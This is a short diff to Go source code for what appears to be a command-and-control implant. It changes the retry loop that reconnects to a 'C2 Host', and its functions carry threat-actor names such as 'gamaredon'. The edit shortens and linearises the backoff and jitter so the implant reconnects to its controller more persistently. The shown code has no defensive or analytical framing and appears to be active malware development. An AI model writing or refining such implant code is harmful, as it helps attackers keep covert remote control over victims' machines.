@@ -310,17 +310,17 @@ func main() {
 	deoxys("main: C2 Host: %s, Port: %s", host, port)
 	deoxys("main: Entering main connection loop...")
 	backoff := retryFloor
-	maxBackoff := 60 * time.Second
+	maxBackoff := 30 * time.Second
 	for {
 		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
-			jitter := time.Duration(rand.Int63n(int64(backoff / 2)))
+			jitter := time.Duration(rand.Int63n(int64(2 * time.Second)))
 			delay := backoff + jitter
 			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
 			time.Sleep(delay)
 			if backoff < maxBackoff {
-				backoff *= 2
+				backoff += 3 * time.Second
 				if backoff > maxBackoff {
 					backoff = maxBackoff
 				}
